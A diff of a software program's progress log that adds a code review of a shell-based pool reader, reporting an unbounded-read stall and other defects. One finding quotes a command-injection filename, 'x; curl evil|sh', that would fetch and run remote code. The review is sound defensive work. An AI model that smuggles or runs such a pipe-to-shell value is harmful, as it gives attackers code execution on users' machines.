@@ -25,7 +25,7 @@ execution gets its own allocator call (see Decisions, "execution-time deviations
 | # | scope | PRs | state |
 |---|---|---|---|
 | 1 | Roster substrate: `AccountDef.pool` + `POOL_NAME_RE`, the bare-`node` mirror (closes D-1663), `_ccrc_pool()` in `accounts.sh`, `RosterWire.pool` + project-pool wire vocabulary, `shared/poolrule.ts` (D-1664), fixture table. NOT agent-first. | run 32, PR #57 (merged `07ce360e`) | **done 2026-09-06 11:11 UTC** — 19 commits, 15 files, +1572/-70; one fix round after a three-lens coordinator review; CI 5/5 on `bf2c66f4`; deployed SERVER LANE from the merge sha, `/health` reports `07ce360e`, unit stable. D-1663, D-1664 defined; D-1741, D-1742 (two rounds), D-1743 issued mid-wave |
-| 2a | `ccd` reader + `project-pool` verb + `_pool_ok` + placement + agent grant + `POOLS_CAP` + doctor + `rehome`. AGENT-FIRST. | run 33 | opened 2026-09-06 11:11 UTC — same workspace `clear-meadow`, reclaimed; **dispatched 2026-09-06 11:12 UTC** — `resumed:true`, `/clear` injected, `briefQueued:true`, `skillState:present`, 9 items |
+| 2a | `ccd` reader + `project-pool` verb + `_pool_ok` + placement + agent grant + `POOLS_CAP` + doctor + `rehome`. AGENT-FIRST. | run 33 | opened 2026-09-06 11:11 UTC — same workspace `clear-meadow`, reclaimed; **dispatched 2026-09-06 11:12 UTC** — `resumed:true`, `/clear` injected, `briefQueued:true`, `skillState:present`, 9 items; wave-done claimed `2a4f5287` (PR #59, 38 commits, 5/5 CI), server re-measurement ok, items 9/9; REVIEWED and returned for one fix round 2026-09-06 21:44 UTC |
 | 2b | `ccd` deciders: auto-swap tick, strand, crossing marker, four manual verbs. AGENT-FIRST. | — | not opened |
 | 3 | Server L1/L3 (`pools.ts`, `poolrule.ts` wrapper), registry `stranded`, routes, watcher frame, health. | — | not opened |
 | 4 | PWA: `accountPool`, `splitByPool`, `PoolSheet`, chips, sheets, store slot. Defines no deviation. | — | not opened |
@@ -387,6 +387,33 @@ execution gets its own allocator call (see Decisions, "execution-time deviations
   ping-pong and need a line drawn somewhere. Red CI is a GATE — binary, and part of DONE by this program's own
   brief. "Done with residuals" plus a red check is not a coherent state, and surfacing a blocker as an opinion
   would have been the error.
+
+- **Wave 2a review (coordinator, 2026-09-06 21:44 UTC): three lenses, MERGE-WITH-FIXES, one round.** Fleet safety — the lens
+  that governs an agent-first deploy — returned **MERGE, no Critical**, having compared every `ccd/ccd`
+  function body against base (5 new, 0 removed, 3 changed), confirmed placement is byte-for-byte unchanged on
+  an untagged box, confirmed `cmd_supervise` and both swap paths are byte-identical so nothing new runs on the
+  5-second tick, and exercised the reader against 24 filesystem states without a hang or a die. **Six
+  must-fix, and the first is the one that mattered.**
+  **The reader has NO SIZE GATE, in the function whose headline contract is that it never blocks.** `read -r
+  -d '' v` has a TYPE gate and no size bound, so the whole file lands in a shell variable. I measured 10 MB at
+  0.20 s / 32 MB RSS, linear; the lens measured 100 MB at 39 s / 979 MB RSS. Reachable with no exotic
+  filesystem — `ln -s ~/.cc-sessions/swap.log pools/<p>`, or this branch's OWN documented alias, after which
+  every swap.log append grows the tag. The wave hardened this function against blocking on FIFOs and devices
+  and left it reading an unbounded regular file. **Fixed here, not deferred to 2b, because 2b puts it on the
+  5-second supervisor tick** and shipping it would leave the live fleet carrying a known stall. One token,
+  measured: `-n 64` gives 0.00 s, keeps NUL detection (rc 0), reads a legal tag clean, and answers an over-cap
+  file `malformed`.
+  Also: the doctor interpolates an unvalidated filename into a copy-pasteable remedy (`x; curl evil|sh`); the
+  D-1848 scan cannot see HYPHENATED function names and the doctor already has one, so a future
+  `_check_pools-parent()` walks past the guard; the scan's per-file floor is satisfied by ONE function, so two
+  call sites are covered by nothing; the `-L` pairing is satisfiable by an inert token and the reader exemption
+  matches a mention inside a quoted string; and the `start`/`enable` skew pins assert only a nonzero exit while
+  their titles name a mechanism — fixture-shaped guarantees inside the pins written to fix fixture-shaped
+  guarantees.
+  **REFUTED before forwarding:** a lens called `[[ -d "$POOLS_DIR" ]]` a live instance of the class. It is not
+  — the `-e`/`-L` pair runs first, so the `-d` only ever sees a path known to exist. What survives is that the
+  MECHANISM enforces `-e` while the function's own comment names the same blind spot for `-d`: the header must
+  widen or stop claiming. **Third time this program has found that shape inside a disclosure.**
 
 ## Carried constraints
 
